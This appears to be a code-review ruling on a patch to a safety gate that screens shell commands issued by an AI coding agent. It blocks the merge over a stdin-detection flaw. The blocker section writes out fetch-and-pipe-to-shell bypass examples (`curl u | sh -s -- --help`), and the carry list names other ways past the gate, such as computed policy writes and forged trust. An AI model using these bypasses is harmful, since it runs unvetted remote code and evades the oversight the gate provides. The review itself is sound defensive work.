**Independent land ruling: BLOCK on one bounded floor regression, not another shell-text arms race.**
Read the ordered corpus, complete patch, candidate code/tests, architecture contract and L3 brief. Runtime results below are seat/sol evidence; I did not rerun them.

### A. Contract
- **(a) Satisfied as amended by A/C, not as originally universal.** `gate-self-protection.test.mjs` covers resolved edit/write paths, aliases, literal Bash/PowerShell targets and matching exceptions; `gate-policy-paths.test.mjs` preserves traversal coverage. Computed-path writes remain reachable.
- **(b) Satisfied with the inherited repair exception.** `gate-survives-mutation.test.mjs` steps 1–5, fresh-process 4b and STOP→repair→reload pin the ratchet, fallback, adoption and widening journal. Repair clears STOP live; new exceptions wait.
- **(c) Satisfied for the declared scanner.** `gate-corpus.test.mjs` compound and unsegmentable groups pin segment-local exceptions and conservative rejection of exceptions.
- **(d) NOT satisfied.** Existing floor/normalization cases pass, but the final stdin change introduces the bypass below.
- **(e) Satisfied for the required corpus.** BUILTINS/L2_BLOCK/ALLOW and interactive cases cover dangerous forms, benign controls, default Block and Allow once. The deliberate `grep "rm -rf"` false positive is pinned.
- **(f) Satisfied.** Mutation step 6 checks empty-matching rejection, warning and journal; reload confirms rejected patterns remain ineffective.
- **(g) Satisfied for the intended ordinary-file examples.** Self-protection PATHS_ALLOW covers notes and handoffs; `gate-status.test.mjs` pins ungated reads. This does not mean every non-policy file bypasses existing protected-path rules.
- **Coverage limits:** native Windows behavior is not executed; the “composed” trust regression only checks rejected writes, not subsequent fresh-policy consumption. Pipe-floor tests using only `^curl` do not prove exception resistance on the receiving segment.

### B. Combined L1+L2 acceptance
L1+L2 now supply the positive/negative corpus, compounds, literal shell/PowerShell mutation checks, aliases, corruption/restart STOP, missing defaults, external repair and genuine gate-survives-mutation coverage.
**Row “1 + 2” is substantially covered, but cannot receive an unqualified pass while the floor regression remains.**
Neither lane prevents arbitrary shell-computed policy writes, same-session post-edit execution, cross-session trust forgery, extension bypass or later input mutation.

### Independent blocker
`packages/nana-pack/lib/gate-shell.ts:257–260` suppresses stdin detection whenever **any** remaining argument equals `--help`, `--version` or non-shell `-V`.
Source-derived examples, **not executed here**:
- `curl u | python3 - --version`
- `curl u | sh -s -- --help`
These still execute stdin; the trailing strings are script arguments. The current scanner returns no floor hit and, with default config, no other hit.
This is a bounded operand-position defect introduced by the benign-version fix—not an expansion into dynamic shell analysis.

### C. Seat rulings and merge harm
- **A: uphold.** Narrowing the claim beats endless text-pattern additions. The sandbox must constrain the whole process and post-edit children, not merely built-in tools.
- **C: uphold.** Project Claude settings/hooks execute code; their declared protection is justified. Ordinary `.claude` content is not blanket-blocked.
- **E: uphold subtraction.** No watchdog/probe is preferable to false timing guarantees. However, 64 KB limits **exception eligibility**, not deny-regex subjects or total analysis work.
- **F/G: uphold.** Invalid/excess denies retain last-good or STOP; never silently discard protection. Same-session `postEdit.commands` execution is now correctly disclosed.
- **Keep STOP absolute:** no repair exception through gated tools. Owner recovery is “edit the named file with any editor outside pi, or delete it—missing means defaults.” Deletion intentionally removes that file’s custom policy.
- Accept >200-pattern migration lockout and trusted-project availability loss with explicit recovery documentation. The “previously first 200” behavior describes an intermediate L2 revision; the L1 patch baseline had no cap.
- **Accumulated policies: narrow the claim, no truncation fix.** Re-capping by dropping denies would violate the ratchet. Document 200 per source list/load, with an uncapped session union.

### D–F. Publication, conduct, coupling
README Gate/Config, `AGENTS.md`, config/gate headers and the actual desk label mostly declare the new contract correctly.
`apps/desk/README.md:235–237` still quotes “allow (skip gate)”; its explanation is correct, its label stale. README’s “caps bound everything else” is false.
The published policy-bypass list faithfully covers sol’s executed categories, though not literally verbatim. It does not disclose the remaining interpreter-argument limitation.
Seat conduct was corrective, not flawless: appetite STOP was ignored; the unverified load-time timing design and overbroad cross-session mitigation were wrong and subsequently withdrawn.
No surviving assertion weakening is evident in the clean diff. Removing tests with the rejected regex design was legitimate. The worker correctly rejected the impossible “detect catastrophic regex after deleting detection” done-condition.
No new unauthorized loosening beyond #8: live STOP recovery is the explicitly inherited L1 exception; non-gate blocks remain live.
**L3:** no semantic conflict. Handoff edits are explicitly allowed absent STOP/custom denies; preserve that test when merging its additive `staleAfterDays` schema leaf.

SCORE: 7/10
MUST:
- Fix stdin option-position handling; add both bypass regressions under receiver-matching allows, retaining benign `python3 --version` ALLOW. Instrument/fix; do not commission sol round four.
- Correct cap/subject claims and stale desk wording; explicitly publish external-editor/delete recovery for both scopes.
CARRY:
- **CRITICAL execution/data-loss cost:** computed policy writes, live post-edit, forged trust and ungated execution channels; require appropriately configured whole-process isolation.
- **HIGH availability cost:** pathological owner/trusted-project regexes can hang; future isolation/safer-engine work, not another in-process probe.
- **MED availability/performance cost:** >200 migration STOP, trusted-project repair trap, uncapped accumulated denies and large-command scans.
- **HIGH cost if assumptions fail:** native Windows, full trust-write→fresh-policy composition and nonstandard/concurrent SDK lifecycle coverage remain incomplete.
- **MED workflow cost:** conservative literal-text false positives; **LOW observability cost:** best-effort journals and first-process absence of a prior widening baseline.
UPSTREAM-CONTRACT DECLARATION: segment-local exceptions; recognized floor before exceptions; gate loosening at session start/reload; tightening live; last-good-or-STOP with external owner repair; non-gate blocks live; policy protection limited to resolved tools/literal command targets; no security-boundary or global work-bound claim.
VERDICT: BLOCK
